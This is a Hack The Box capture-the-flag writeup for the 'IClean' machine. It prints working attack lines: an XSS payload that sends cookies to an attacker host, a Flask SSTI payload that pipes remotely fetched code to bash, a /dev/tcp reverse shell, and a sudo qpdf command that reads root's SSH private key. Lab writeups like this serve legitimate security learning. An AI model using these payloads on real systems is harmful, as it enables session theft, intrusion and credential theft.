# 🧼 Hack The Box - IClean Writeup 

> Difficulty: *Medium*  
> Tags: XSS, SSTI, Flask, Cookie Stealing, MySQL, qpdf, Privilege Escalation  
> Author: *mohamed tarek*

---

## 🧾 Summary

This writeup covers the steps I used to gain root access on the **IClean** machine. The attack path included:

- XSS leading to **cookie stealing**
- **SSTI** in Flask bypassing filters
- Cracking MySQL password hashes
- Exploiting **qpdf** misconfiguration for privilege escalation

---

## 🔍 Reconnaissance

Initial Nmap scan:

```bash
nmap -sC -sV -v <target ip>

Open ports:

22/tcp - SSH

80/tcp - HTTP

Wappalyzer detected the web framework as Flask

## 🔎 Enumeration

Navigating to /login/ revealed nothing of interest.

The /quote/ page allowed input via the service parameter, which was vulnerable to XSS.

XSS Test:
<img src="http://<attacker_ip>:8000">

This was URL-encoded via Burp Suite and sent to the server. A request hit the listener, confirming reflected XSS.

Discovered /dashboard/ via feroxbuster, but it required authentication.

## 🍪 Exploiting XSS: Cookie Stealing

Used a classic XSS payload to steal session cookies:

<img src=x onerror=fetch('http://<attacker_ip>:8000/?c='+document.cookie);>

Set up a Python HTTP server to catch the cookie.

Added the stolen session cookie to the browser using "Cookie Editor" under the name session, which granted access to /dashboard/.

## 🧾 SSTI to RCE (QRGenerator)

The dashboard allows generating invoices and QR codes.

At /QRGenerator/, the input was vulnerable to Server-Side Template Injection.

SSTI Confirmation:
Input:
{{7*7}}

Output contained 49 → confirmed SSTI.

Bypassing Filters:
Used encoded Flask SSTI payload for RCE

{{request|attr("application")|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("popen")("curl <attacker_ip>:8000/revshell | bash")|attr("read")()}}

Set up HTTP server and listener:

python3 -m http.server
nc -lvnp <port>

Reverse shell script:

#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'

After submission, shell connected back successfully.

## 🛠️ Local Enumeration

Found Flask app source in /opt/app/app.py.

Discovered database credentials for MySQL:

mysql -u iclean -p

Dumped user password hashes (admin and consuela).

Cracked consuela's hash using crackstation.net. admin remained uncracked.

## 🔐 Privilege Escalation via qpdf

As user consuela, I could execute qpdf as root:

sudo -l
# Output:
# (ALL) NOPASSWD: /usr/bin/qpdf

Used qpdf to exfiltrate root’s private SSH key:

sudo /usr/bin/qpdf --empty /tmp/priv_key.txt --qdf --add-attachment /root/.ssh/id_rsa --

The key was saved in /tmp/priv_key.txt.

Copied it locally:

chmod 600 id_rsa
ssh -i id_rsa root@<target_ip>

## 🏁 Root Flag

After successful SSH login as root, grabbed the root flag:

cat /root/root.txt

## 🧠 Lessons Learned

XSS can become powerful when chained with session hijacking.

Always test for SSTI in Flask apps with filtered input.

qpdf is a lesser-known but very effective privilege escalation vector.

Cracking password hashes is sometimes necessary to move forward.

## 🔧 Tools Used
nmap

feroxbuster

Burp Suite

Python HTTP server

netcat

Cookie Editor Extension

crackstation.net
